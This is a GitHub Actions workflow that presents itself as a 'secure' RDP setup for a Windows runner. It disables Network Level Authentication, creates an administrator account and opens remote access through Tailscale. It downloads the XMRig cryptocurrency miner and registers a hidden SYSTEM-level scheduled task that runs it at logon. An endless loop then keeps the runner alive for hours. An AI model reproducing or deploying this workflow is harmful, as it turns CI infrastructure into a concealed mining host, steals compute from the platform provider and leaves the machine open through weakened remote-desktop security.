name: RDP

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Configure Core RDP Settings
        run: |
          # Enable Remote Desktop and disable Network Level Authentication (if needed)
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                             -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "SecurityLayer" -Value 0 -Force
          netsh advfirewall firewall delete rule name="RDP-Tailscale"
          netsh advfirewall firewall add rule name="RDP-Tailscale" `
            dir=in action=allow protocol=TCP localport=3389
          # Comment out or remove the restart to avoid hanging in GitHub Actions runner
          # Restart-Service -Name TermService -Force
          Write-Host "RDP settings configured (no service restart to prevent hang)"
      - name: Create RDP User with Password from Secret
        env:
          RDP_PASSWORD: ${{ secrets.RDP_PASSWORD }}
        run: |
          if (-not $env:RDP_PASSWORD -or $env:RDP_PASSWORD -eq '') {
              Write-Error "No RDP_PASSWORD secret provided. Please set it in GitHub Secrets."
              exit 1
          }
          $securePass = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
          if (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue) {
              Remove-LocalUser -Name "RDP"
          }
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          echo "RDP_CREDS=User: RDP | Password stored in GitHub Secret" >> $env:GITHUB_ENV
          if (-not (Get-LocalUser -Name "RDP")) {
              Write-Error "User creation failed"
              exit 1
          }
      - name: Download and Extract XMRig ZIP
        run: |
          $url = "https://github.com/Darkbarrier/RDP/raw/main/xmrig-6.24.0-windows-x64.zip"
          $zipPath = "C:\xmrig.zip"
          $extractPath = "C:\xmrig"
          try {
              Write-Host "Downloading ZIP from $url..."
              Invoke-WebRequest -Uri $url -OutFile $zipPath -ErrorAction Stop
              Write-Host "Extracting ZIP to $extractPath..."
              Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force -ErrorAction Stop
              Remove-Item $zipPath -Force -ErrorAction Stop
              Write-Host "XMRig extracted to $extractPath"
              $exePath = "C:\xmrig\xmrig-6.24.0\xmrig.exe"  # Adjust to "C:\xm\hello.exe" if needed
              if (-not (Test-Path $exePath)) {
                  Write-Error "Executable not found at $exePath"
                  exit 1
              }
          } catch {
              Write-Error "Failed to download or extract ZIP: $_"
              exit 1
          }
      
      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force

      - name: Create XMRig Task for RDP Logon
        run: |
          $exePath = "C:\xmrig\xmrig-6.24.0\xmrig.exe"
          $configPath = "C:\xmrig\xmrig-6.24.0\config.json"
          $taskName = "XMRigAutoStart"
          if (-not (Test-Path $exePath)) { Write-Error "Executable not found at $exePath"; exit 1 }
          if (-not (Test-Path $configPath)) { Write-Error "Config file not found at $configPath"; exit 1 }
          $taskXml = @"
          <?xml version="1.0" encoding="UTF-16"?>
          <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
            <Triggers>
              <LogonTrigger>
                <Enabled>true</Enabled>
                <UserId>RDP</UserId>
              </LogonTrigger>
            </Triggers>
            <Principals>
              <Principal id="Author">
                <UserId>NT AUTHORITY\SYSTEM</UserId>
                <LogonType>ServiceAccount</LogonType>
                <RunLevel>HighestAvailable</RunLevel>
              </Principal>
            </Principals>
            <Settings>
              <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
              <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
              <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
              <AllowHardTerminate>true</AllowHardTerminate>
              <StartWhenAvailable>true</StartWhenAvailable>
              <Hidden>true</Hidden>
            </Settings>
            <Actions Context="Author">
              <Exec>
                <Command>$exePath</Command>
                <Arguments>--config=$configPath</Arguments>
              </Exec>
            </Actions>
          </Task>
          "@
          Register-ScheduledTask -TaskName $taskName -Xml $taskXml -Force -ErrorAction Stop
          Write-Host "Task '$taskName' created for RDP user logon"
        shell: pwsh
        env:
          RDP_CREDS:User: RDP | Password stored in GitHub Secret
      
      - name: Establish Tailscale Connection
        run: |
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
          $tsIP = $null
          $retries = 0
          while (-not $tsIP -and $retries -lt 10) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              Start-Sleep -Seconds 5
              $retries++
          }
          if (-not $tsIP) {
              Write-Error "Tailscale IP not assigned. Exiting."
              exit 1
          }
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
      - name: Verify RDP Accessibility
        run: |
          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
          if (-not $testResult.TcpTestSucceeded) {
              Write-Error "TCP connection to RDP port 3389 failed"
              exit 1
          }
          Write-Host "TCP connectivity successful!"
      - name: Maintain Connection
        run: |
          Write-Host "`n=== RDP ACCESS ==="
          Write-Host "Address: $env:TAILSCALE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password is stored in your GitHub Secret (RDP_PASSWORD)"
          Write-Host "==================`n"
          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
              Start-Sleep -Seconds 300
          }
